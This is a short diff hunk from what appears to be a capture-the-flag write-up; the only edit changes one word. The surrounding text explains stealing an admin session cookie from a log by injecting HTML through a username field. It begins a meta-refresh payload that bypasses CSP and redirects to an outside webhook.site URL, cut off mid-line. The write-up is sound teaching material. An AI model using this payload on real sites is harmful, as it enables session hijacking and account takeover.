@@ -98,7 +98,7 @@ If we look at the code above (the admin one), we can see that not only the usern
 such as <code>http://127.0.0.1:8080/admin?view=file:///flag.html</code>, its session id (authentication cookie) is written to the log. If we can exfiltrate this,
 we can authenticate to the server as admin. There is only text in the log, but we can insert HTML through the username.
 How can we exfiltrate the admin cookie with a very strict CSP policy? With a <code>meta</code> tag that redirects the client to a URL that
-incorporates part of the content of the log (administrative cookies included) inside it:
+incorporates part of the content of the log (admin cookies included) inside it:
 ```html
 .... <html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=
 
